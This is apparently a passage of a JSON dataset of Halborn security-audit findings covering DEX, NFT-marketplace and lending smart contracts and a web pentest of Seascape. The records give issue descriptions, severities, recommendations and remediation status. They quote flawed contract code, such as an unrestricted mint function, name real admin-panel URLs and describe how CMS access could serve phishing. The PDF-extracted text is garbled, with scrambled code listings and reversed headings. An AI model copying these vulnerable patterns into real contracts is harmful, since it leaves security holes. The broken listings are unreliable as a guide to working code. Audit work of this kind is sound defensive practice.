        "body": "In the contract Box.sol there are functions marked as public but they are never directly called within the same contract or in any of its descendants: Box.sol - store(uint256) (Box.sol#12-15) - retrieve() (Box.sol#18-20) - decrement() (Box.sol#22-25) AllRouterSwap.sol - initialize(address,address,address[],address[]) (AllRouterSwap.sol#64-77) - changeOwner(address) (AllRouterSwap.sol#88-91) - addCommonToken(address) (AllRouterSwap.sol#93-96) - showOwner() (AllRouterSwap.sol#98-101) - [],bool) (AllRouterSwap.sol#312-352) - swapToETH(uint256[],address[],uint8[][],uint256[]) (AllRouterSwap.sol#354-363) swap(uint256[],address[],uint8[][],bool[],address,bool,bool,uint256 Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external to reduce gas costs. 28 Remediation Plan: SOLVED: The MatrixSwap team set all the mentioned functions as external to reduce gas costs. 29 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE OF ASSERT FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MatrixSwap_DEX_Aggregator_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract AllRouterSwap.sol the function assert is used. As per Solidity documentation: Assert The assert function creates an error of type Panic(uint256). should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic, not even on invalid external input. Code Location: Listing 9: Assertl (Lines 125) 121 if ( SwapLibrary . _isWrapUnwrap ( _path [0] , _path [1] , addressWETH )) 122 { 123 124 125 126 } WETH = IWETH ( _path [0]) ; WETH . deposit { value : _amountIn }() ; assert ( WETH . transfer ( msg . sender , _amountIn )); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use a require statement instead. 30 Remediation Plan: SOLVED: The MatrixSwap team is correctly using now a require statement. 31 MANUAL TESTING 32 4.1 TESTING CONTRACT INITIALIZATION FRONT-RUNNING As the contracts Swap and AdminBox make use of initialize functions we have checked if they could be front-run but this is not the case as they have a constructor: Do not leave an implementation contract uninitialized. An uninitialized implementation contract can be taken over by an attacker, which may impact the proxy. You can either invoke the initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed: AdminBox contract Swap contract G N I T S E T L A U N A M 33 Below we can see how they were automatically initialized right after being deployed: G N I T S E T L A U N A M 34 4.2 TESTING CONTRACT UPGRADEABILITY In this test we wanted to test the upgradeability of the contract. In order to do that we have created a SwapV2 contract which adds a new simple getter function: Listing 10: SwapV2 - getisSingleEth() 1 function get_isSingleEth () public view returns ( bool ){ 2 3 } return isSingleEth ; SwapV1 was deployed. As the next step, the owner of the SwapV1 contract was updated by calling changeOwner function. The new owner is accounts [1]. Then using a proxy upgrade pattern, we upgraded the Swap contract to the SwapV2, checked that the owner of the SwapV2 contract was still accounts[1] and called the new function: G N I T S E T L A U N A M It is also possible, as included in the test cases of the project, to upgrade the contract using the OpenZeppelin Upgrades Plugins. 35 ",
        "labels": [
            "Halborn",
            "MatrixSwap_DEX_Aggregator",
            "Severity: Informational"
        ]
    },
    {
        "title": "WEAK CMS PASSWORD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "Testing revealed that the application Content Management System (CMS) management interface was accessible with an easy-to-guess username and The username was the same as the application password combination. name, as well as the password being trivial to guess. Additionally, the same credentials allowed to access both the testing and the production environments. After logging in, users were presented with different interfaces that allowed to modify the content displayed to the users, as well as collecting sensitive information about the backend infrastructure. For instance, users with access to the CMS could edit pages content, insert their own malicious links, send phishing emails to Seascape newsletter contacts, add and modify mini-games details. It should be noted that the full criticality of this issue was not assessed by Halborn, as Seascape promptly amended the CMS credentials to prevent any unauthorized access to the platform. Code Location: The following screenshots show some of the functionality which could be exploited by a malicious user with access to the CMS backend. Below is presented the sensitive information that was disclosed about the servers technology stack in use: 14 The following functionality could be abused to send phishing emails that would come from Seascapes official domain. Thus, users would be more likely to fall victim to the attack: The edit page functionality could be used to deface the applications front end as well as insert malicious code such as JavaScript (which could trigger Cross-Site Scripting (XSS) vulnerabilities) and malicious links. 15 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Whilst the issue was remediated by Seascape during the assessment window, the following recommendations for secure password generation should be taken into consideration. A strong password policy can significantly reduce the risk of an attacker being able to gain access through a password guessing attack. A strong password should be at least 16 characters in length. Complex- ity requirements (i.e., upper and lowercase letters, numbers and special characters) will also increase a passwords strength, but these require- ments can make it more difficult for people to set and remember passwords, and do not contribute as much to password strength as pure length. Longer passwords without complex character requirements are considered both eas- ier for humans to remember and more difficult to guess or brute-force via automated means. Therefore, it is recommended that, to reduce the burden on users memories, complexity requirements are removed from the policy in tandem with the increase in minimum length. To accommodate the increased length requirement, users should be encour- aged to consider their passwords to be passphrases rather than single words. A phrase such as todayiwillworkverywellindeed is easier to remem- ber and significantly less likely to be guessed through standard password guessing techniques than a short but complex password such as Pa$$w0rd1. As administrative accounts are commonly targeted by attackers, it is recommended that these accounts are further secured by requiring a higher minimum number of characters, such as 20. As an additional measure, it is advised to add commonly used passwords to a blacklist, which would significantly increase the resilience of user accounts to password guessing attacks. Users should not be able to 16 choose passwords containing words that appear in the blacklist, which should contain the following:  The username  The company name  The application name  Months and seasons  Commonly used weak passwords (password, secret, etc.) Remediation Plan: SOLVED: The Seascape team amended the password to be more secure. 17 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Critical"
        ]
    },
    {
        "title": "ADMIN PANEL PUBLICLY EXPOSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "Testing revealed that the application exposed different login pages to the users. One of them was the CMS admin panel. It should be noted that one of the login pages allowed users to register an account. Seascape explained that users who log in with this interface would only be allowed to access extra content should an admin authorized them to do so. Code Location: The following three URLs allowed access to the aforementioned login pages:  https://beta-bsc.seascape.network/admin/Login/index.html  https://beta-bsc.seascape.network/index/user/login  https://beta-bsc.seascape.network/index/login/login Risk Level: Likelihood - 3 Impact - 3 Recommendation: Where possible, admin panels should only be accessible to the required users, for instance by implementing IP address whitelisting. Addition- ally, it is recommended to remove any unused functionality that might be used for testing, as this opens up unnecessary attack surface. Finally, strong password policy requirements should be followed to ensure that any unauthorized user cannot access sensitive content. Please refer to the Weak CMS Password recommendations above. 18 Remediation Plan: PARTIALLY SOLVED: The Seascape team acknowledged the issue and informed that they have implemented IP address whitelisting only on the authenti- cated part of the application, but not on the panel itself. 19 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "SENSITIVE INFORMATION DISCLOSURE VIA VERBOSE ERROR MESSAGES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "Within the testing environment, it was identified that by accessing nonexistent pages, a stack trace would be presented to the user. Within the content of the server response, sensitive information was identified, such as database hostname, username, and password. While the database host was inaccessible, these credentials might be used on other environments, and their disclosure increased Seascapes attack surface. Code Location: It was possible to generate a stack trace by accessing unavailable content such as the following page: https://beta-bsc.seascape.network/admin/reset The extract from the server response is presented below: Listing 1 America / New_York [ Redacted ] 1 TIMEZONE 2 HOSTNAME 3 ethplatform CWS - ETH 4 bsc PancakeSwap 5 bscplatform pCWS - BNB 6 api https :// beta - api . seascape . network / 7 nftAddress 8 burning 0 x3Cd60dEc3F8623B61537A8A681850c776709Ac5A 9 PASSWORD 10 crownsAddress 11 USERNAME 12 PHP_MEMORY_LIMIT 13 PATH beta_seascape [ Redacted ] 512 M 0 x7115ABcCa5f0702E177f172C1c14b3F686d6A63a 0 x168840Df293413A930d3D40baB6e1Cd8F406719D / usr / local / sbin :/ usr / local / bin :/ usr / sbin :/ usr / bin :/ sbin :/ bin 20 14 default_lang 15 DATABASE 16 PWD / data / code 17 domain beta en - us beta_eth_seascape Risk Level: Likelihood - 3 Impact - 3 Recommendation: Halborn recommends that the testing environment is either made accessible only to whitelisted IP addresses or that the debug feature is disabled. Additionally, Seascape should ensure that the identified password is not used elsewhere in their infrastructure, to prevent attackers from accessing unauthorized content. Remediation Plan: PARTIALLY SOLVED: The issue is not present on the production environment however users would be able to recover the sensitive information via the messages disclosed in the testing environment. It should be noted that the production environment is a replica of the testing one therefore the information would still be of use. 21 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "OUTDATED THINKPHP VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "By observing the server response on nonexistent pages, it was possible to identify the exact ThinkPHP version number. The version in use by Seascape was version 6.0.5, which is outdated. At the time of writing this report, the most recent version is 6.0.11. One critical vulnerability was identified in ThinkPHP version 6.0.8. However, it was not confirmed if this applied to the version in use by Seascape. By using an outdated software version, Seascape might not benefit from features and security enhancements available on the new version of this framework. Code Location: The following screenshot shows the framework version being disclosed on the production environment: Risk Level: Likelihood - 3 Impact - 3 22 Recommendation: Halborn recommends that a patch management policy is implemented to ensure that all software components are updated to the latest stable and secure versions at all times. This would minimize the window of opportunity that an attacker would have to exploit any vulnerabilities affecting these components. For ThinkPHP, the latest stable version is version 6.0.11 - available at ThinkPHP GitHub. Remediation Plan: RISK ACCEPTED: The development team weighted the risk and time resources required to upgrade the version and are happy to continue using the current one. 23 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF PACKAGES WITH KNOWN VULNERABILITIES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "The application uses third-party dependencies to delegate handling of different kind of operations, e.g., generation of document in a specific format, HTTP communications, data parsing of a specific format, etc. However, the dependencies bring forth an expected downside where the security posture of the real application is now resting on them. Several imported packages were found to not be updated to the latest version and presented various security risks, as described below. Vulnerabilities List: Title Denial of Service (DoS) Prototype Pollution Denial of Service (DoS) Command Injection DoS Arbitrary File Creation Prototype Pollution Package global-parent ini is-svg lodash ssri tar y18n Severity HIGH HIGH HIGH HIGH HIGH HIGH HIGH Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is highly recommended performing automated analysis of the dependencies from the birth of the project and if they happen to contain any security issues. The Seascape team needs to be aware of it and apply the required mitigation measures to secure the affected application. 24 Remediation Plan: SOLVED: The Seascape team performed an update of the dependencies in use. 25 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING HTTP SECURITY HEADERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "The assessment revealed several security headers were not enforced by the application. These headers are used by client browsers to ensure various security controls are appropriately implemented during the normal functioning of the application.  X-Content-Type-Options, which indicates that the MIME types adver- tised in the Content-Type headers should not be changed and be followed.  X-Frame-Options, which indicates whether a browser should be allowed to render a page in a <frame>, <iframe>, <embed> or <object>.  Content-Security-Policy, which allows website administrators to con- trol resources the user agent is allowed to load for a given page.  Strict-Transport-Security (HSTS) - which enforces secure transmis- sion by letting a website tell browsers that it should only be accessed using HTTPS, instead of using HTTP.  Referrer-Policy - specifies what information, or parts of it, should be sent in the Referer header with the request that prompted the redirection.  Cache-Control - instructs the browser: should be stored in the temporary memory. if, how and which items  Pragma - using the no-cache directive forces the browser to query the server before downloading a cached copy of the page, resulting in the download of the most recent version.  Expires - includes a date, period, or value indicating when the servers response is no longer correct. It should be noted that in some situations Strict-Transport-Security and X-Content-Type-Options (and in some cases X-Frame-Options) do not neces- sarily have to be enabled by the application directly. These headers can be injected by supporting load balancers or web application accelerators. 26 Recommendation: Seascape should review the above security headers and ensure that where appropriate these headers are included within all exposed endpoints and services. This allows Seascape to ensure the defence-in-depth approach is achieved thought the application. References: Strict-Transport-Security X-Content-Type-Options X-Frame-Options Content-Type Remediation Plan: RISK ACCEPTED: The development team informed that they will look into enabling the recommended headers. 27 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "SESSION COOKIE WITHOUT SECURE AND HTTPONLY FLAGS SET",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "After logging to the CMS, the application server set a PHP cookie. Cookies are used by web applications to store information relating to the site within the users browser. In particular, cookies typically contain session information that ties individual requests to the application with a specific user. The following observations were made on the applications session cookie. The HttpOnly flag was not set for the cookie used by the application, which could allow an attacker to impersonate users by stealing their sessions, should cross-site scripting vulnerabilities be discovered in the application in the future, potentially allowing them to impersonate the applications users. Additionally, without the secure flag, the cookies contents could potentially traverse a clear text channel, which could result in an attacker gaining access to a users session information. The Secure flag is an attribute of cookies that instructs a browser whether a cookie can be transmitted over a clear text channel, such as HTTP. Cookies that are sent over a clear text channel can be intercepted by an attacker that is suitably positioned on the network. Once intercepted, the cookies content can be read or altered to suit the attackers needs. If the Secure flag is set, the browser will only send the cookie over an HTTPS connection. Due to the encrypted nature of HTTPS, similar attacks would no longer be possible. The application only communicated over an encrypted HTTPS channel. There- fore, it was not possible for an attacker to create a condition in which However, the cookie would be transmitted over a clear text channel. security best practice dictates that cookies containing session tracking information should be protected with the Secure flag. 28 Code Location: The Secure and HttpOnly flags are stipulated in the Set-Cookie header, as the value is assigned. As can be seen in the extract below, this flag was not present. Listing 2 1 HTTP /1.1 200 OK 2 Date : Fri , 07 Jan 2022 15:26:34 GMT 3 Content - Type : application / json ; charset = utf -8 4 Connection : close 5 Cf - Railgun : c4a0eb76c8 stream 0.000000 0210 57 da 6 Set - Cookie : think_lang = en - us ; path =/; domain = seascape . network 7 Set - Cookie : PHPSESSID =[ Redacted ]; path =/; domain = seascape . network 8 X - Powered - By : PHP /7.3.31 9 CF - Cache - Status : DYNAMIC 10 Expect - CT : max - age =604800 , report - uri =\" https :// report - uri . cloudflare . com / cdn - cgi / beacon / expect - ct \" 11 Server : cloudflare 12 CF - RAY : 6 c9e3485db8b71d8 - LHR 13 alt - svc : h3 =\":443\"; ma =86400 , h3 -29=\":443\"; ma =86400 , h3 -28=\":443\"; ma =86400 , h3 -27=\":443\"; ma =86400 14 Content - Length : 9630 Risk Level: Likelihood - 2 Impact - 2 Recommendation: The Secure flag and the HttpOnly flag should be set on all cookies containing sensitive data such as user session tokens. Once enabled, these flags will be visible in the web servers Set-Cookie headers. The source code of the application can either be amended, or the config- uration changes can be applied to the hosting server and/or the reverse proxy. The directives would depend on the server in use. 29 Remediation Plan: RISK ACCEPTED: The Seascape team confirmed that they will amend the server side configuration to add the HttpOnly and secure flag to cookies. 30 ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "TLS MISCONFIGURATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "FRONT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Seascape_Minigames_Web_Pentest_Report_Halborn_Final.pdf",
        "body": "Testing revealed that the application fronted did not display correctly formatted content when opening the Zombie minigame. Whilst this does not pose a direct security risk, it could lead an attacker to believe that the component is vulnerable to HTML injection or cross-site scripting (XSS) and expose the application to more targeted attacks. Code Location: The following screenshot displays the frontend error: 34 35 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Halborn recommends that the frontend is reviewed to ensure that all components work as expected and display the correct data. Remediation Plan: SOLVED: This issue only appeared in the testing environment and was fixed. 36 3.10 (HAL-10) HARDCODED AND WEAK CREDENTIALS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Seascape_Minigames_Web_Pentest",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNRESTRICTED TOKEN MINTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Yieldly.sol, The owner can call mintAll function for the token minting. However, the mint function does not have any access control modifier. An attacker can mint any tokenId via the public function. Code Location: Listing 1: Yieldly.sol (Lines 14) 14 15 16 17 18 19 20 21 22 function mint ( uint256 _id , address _to , string memory ) public { _tokenURI _safeMint ( _to , _id ); _setTokenURI ( _id , _tokenURI ); } Risk Level: Likelihood - 4 Impact - 4 Recommendation: Consider to make function private. The function should be called from the users and the contract should eliminate centralization risks. Remediation plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 19 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: High"
        ]
    },
    {
        "title": "BID TIME CONFUSION ON THE AUCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Marketplace.sol, When creating bid for the auction, the contract does not set the bid date. The code section is commented out the relative set statement. On the other hand, firstBidTime is set when the auction created. Therefore, It doesnt show the correct timestamp. Code Location: Listing 2: Marketplace.sol (Lines 404) 402 403 404 405 406 407 408 409 410 411 if ( auctions [ tokenId ]. amount == 0) { // If so , it is the first bid . // auctions [ tokenId ]. firstBidTime = block . timestamp ; // We only need to check if the bid matches reserve bid for the first bid , // since future checks will need to be higher than any previous bid . require ( amount >= auctions [ tokenId ]. reservePrice , \" Must bid reservePrice or more \" ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Ensure that firstBidTime is set on the bid creation if it is not an intended behaviour. 20 Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 21 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "CENTRALIZATION RISK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Marketplace smart contract, the admin has the authority over the NFT token transfer. Any compromise to the privileged account which has access to onlyAdminRecovery may allow the attacker to take advantage. Code Location: Listing 3: Marketplace.sol (Lines 556) 556 557 558 559 560 561 562 563 564 565 function recoverNFT ( uint256 tokenId ) external onlyAdminRecovery { Yieldly ( nftContract ). transferFrom ( // From the auction contract . address ( this ) , // To the recovery account . adminRecoveryAddress , // For the specified token . tokenId ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider to carefully manage the privileged accounts private key to avoid any potential risks of being hacked. In the general, we are recommending centralized privileges or roles in the protocol to be improved via a decentralized mechanism or smart-contract based accounts with the enhanced 22 security practices, e.g, Multisignature wallets. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 23 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF START DATE CHECK ON THE AUCTION CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the dynamic testing, It has been seen that start_Date variable is not checked. When the new auction is created, Start-Date should be equal or more than the Latest Timestamp. Code Location: Listing 4: Start Date Has Not Been Checked 1 2 3 4 5 6 function createAuction ( uint256 tokenId , uint256 startDate , uint256 duration , uint256 reservePrice ) public nonReentrant whenNotPaused auctionNonExistant ( tokenId ) {} Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider to check start date is more than the latest timestamp. Listing 5 1 require ( startDate >= block . timestamp , \" Can ' t create past auction !\") ; 24 Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 25 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contracts, nftContract, WMATICAddress and adminRecoveryAddress are missing address validation in their constructors. Every address should be validated and checked that is different from zero. Code Location: Listing 6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 constructor ( address nftContract_ , address WMATICAddress_ , address adminRecoveryAddress_ ) { require ( IERC165 ( nftContract_ ). supportsInterface ( ERC721_INTERFACE_ID ) , \" Contract at nftContract_ address does not support NFT interface \" ); // Initialize immutable memory . nftContract = nftContract_ ; WMATICAddress = WMATICAddress_ ; adminRecoveryAddress = adminRecoveryAddress_ ; // Initialize mutable memory . _paused = false ; _adminRecoveryEnabled = true ; } Risk Level: Likelihood - 2 Impact - 2 26 Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 27 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF PAUSE MODIFIER ON THE MINT FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Marketplace.sol contract, during the contract is paused, the mint functionality is not paused. Code Location: Listing 7 1 function mint ( string memory _tokenURI , uint256 _price , bool _isListOnMarketplace , uint256 _royalty , uint256 startDate , uint256 auctionLength ) public Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider review pause/unpause functionalities and activate them on the related functions. Remediation Plan: SOLVED: The issue was fixed in the following commit : Fix Commit. 28 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "TOKEN IS BUYABLE WHEN THE AUCTION IS ACTIVE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Marketplace.sol contract, when the auction is active for the token, the token is still buyable. It depends on the behavior, the auction should be cancelled after the token bought by another owner. Code Location: Listing 8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function buy ( uint _id , uint256 _price ) external payable { _validate ( _id ); require ( price [ _id ]== _price , \" Error , price is not match \" ); address _previousOwner = ownerMap [ _id ]; address _newOwner = msg . sender ; // 2.5% commission cut uint256 _commissionValue = price [ _id ]. mul (25) . div (1000) ; uint256 _royaltyValue = price [ _id ]. mul ( royaltyMap [ _id ]) . div (100) ; uint256 _sellerValue = price [ _id ]. sub ( _commissionValue + _royaltyValue ); // _owner . transfer ( _owner , _sellerValue ) ; transferMATICOrWMATIC ( payable ( _previousOwner ) , _sellerValue ); transferMATICOrWMATIC ( payable ( creatorMap [ _id ]) , _royaltyValue ); transferMATICOrWMATIC ( payable ( adminRecoveryAddress ) , _commissionValue ); Yieldly ( nftContract ). transferFrom ( address ( this ) , _newOwner , _id ); ownerMap [ _id ] = msg . sender ; listedMap [ _id ] = false ; emit Purchase ( _previousOwner , _newOwner , price [ _id ], _id ); } 29 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that the behavior is intended, If It is not, cancel the current auction for the token id. Remediation Plan: RISK ACCEPTED: The Yieldly.Finance team accepted the risk for this find- ing. 30 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Owner of the contract is usually the account which deploys the contract. As a result, the Owner is able to perform privileged actions Two of the contracts are such as withdraw, mintBatch, addCreatorMap. inherited from Ownable contract. In the Marketplace.sol and Yieldly.sol, smart contract, the renounceOwnership function is used to renounce being If an owner is mistakenly renounced, administrative access an owner. would result in the contract having no Owner, eliminating the ability to call privileged functions. In such a case, contracts would have to be redeployed. Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As another solution, Renounce Ownership functionality can be disabled with the following line of codes. Listing 9: Disable Renounce Ownership (Lines 2) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \"); // not possible with this smart contract } 31 Remediation Plan: RISK ACCEPTED: The Yieldly.Finance team accepted the risk for this find- ing. 32 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Low"
        ]
    },
    {
        "title": "MISFUNCTIONAL TOKEN OWNER SET ON THE AUCTION CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Polygon_NFT_MarketPlace_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Marketplace.sol, The owner of tokenId can create an auction. However, on the Line #359, the owner of the token is set to msg.sender. The check can cause serious problems in the contract, but transferFrom function is protecting the contract from a risk. Code Location: Listing 10: Marketplace.sol (Lines 359) 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 function createAuction ( uint256 tokenId , uint256 startDate , uint256 duration , uint256 reservePrice ) public nonReentrant whenNotPaused auctionNonExistant ( tokenId ) { // Check basic input requirements are reasonable . require ( msg . sender != address (0) ) ; // Initialize the auction details , including null values . // if ( _isNew ) { // // // // // // _tokenIds . increment () ; uint256 newTokenId = _tokenIds . current () ; tokenId = newTokenId ; price [ tokenId ] = reservePrice ; creatorMap [ tokenId ] = Creator ; Yieldly ( nftContract ) . mint ( tokenId , msg . sender , _tokenUri ) ; // } ownerMap [ tokenId ] = msg . sender ; openTrade ( tokenId , reservePrice ); } 33 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider deleting the following code statement. Listing 11 1 ownerMap [ tokenId ] = msg . sender ; Remediation Plan: ACKNOWLEDGED: The Yieldly.Finance team acknowledged this finding. 34 3.10 (HAL-10) USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Polygon_NFT_MarketPlace",
            "Severity: Informational"
        ]
    },
    {
        "title": "CAUSE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Ethereum_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _payBackLoan under DirectLoanBaseMinimal does not pre-check the users balance by being payoffAmount + adminFee + revenueShare it does so in- crementally. Risk Level: Likelihood - 1 Impact - 1 Recommendation: It would be nice if the code cloud pre-check if the user had enough balance for all transfers combined instead of checking and transferring incrementally. It is recommended to always check pre/post balances after a transfer. Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 13 MANUAL ANALYSIS 14 The functionDelegateCall is used on:  airdrop/AirdropFlashLoan.sol  airdrop/AirdropReceiver.sol  loans/direct/loanTypes/LoanAirdropUtils.sol _transferNFT makes a delegate call on the _nftTransferWrapper and _nftWrapper contexts, calling the transferNFT function. This means that all wrappers registered in PermittedNFTsAndTypeRegistry should not register any storage variable; otherwise, storage layout issues and collision could occur. all contracts present in nftTypeRegistry do not hold any storage variable, which makes them compatible with the delegate calling system. Currently,  loans/direct/loanTypes/DirectLoanBaseMinimal.sol _transferNFT does delegate to the nftCollateralWrapper loan in the con- text of the contract that implements DirectLoanBaseMinimal. At this time, there is only one contract that extends DirectLoanBaseMinimal which cor- responds to the DirectLoanFixedOffer contract. The DirectLoanFixedOffer contract does not add new storage variables, but will get all the variables present in DirectLoanBaseMinimal which extends BaseLoan, NftReceiver and LoanData. Taking this into account, storage collision could be pos- sible between nftCollateralWrapper and DirectLoanBaseMinimal contract. Although the mappings will be used in the nftCollateralWrappers code, it is still possible that some mapping may collide. When transferring the mapping used in the NFT code are the following: Listing 1 1 2 mapping ( address => uint256 ) private _balances ; mapping ( uint256 => address ) private _tokenApprovals ; The functionCall is used on:  airdrop/AirdropFlashLoan.sol 15 S I S Y L A N A L A U N A M  airdrop/AirdropReceiver.sol Both contracts use a call to a user-specified target with any call data. However, both calldata and target are checked against IPermittedAirdrops for validity, and only allow anything other than the one approved by the owners via setAirdroptPermit or setAirdroptPermits. 4.1 NftfiHub This contract is a central point for all the contracts registered in the NFTfi system. When a contract needs the address of another contract, it will refer to the hub with a key and the hub will be providing the corresponding address.  All critical functions like setContract, setContracts are being checked for ownership  A contract key that does not exist will return a zero address. 4.2 DirectLoanCoordinator It will have the LOAN_COORDINATOR_ROLE role in the SmartNFT contract  What if the user burns obligationReceiptToken NFTs before the loan period ends?  It is not possible to burn tokens, only resolveLoan does it. promissoryNoteToken the and 4.3 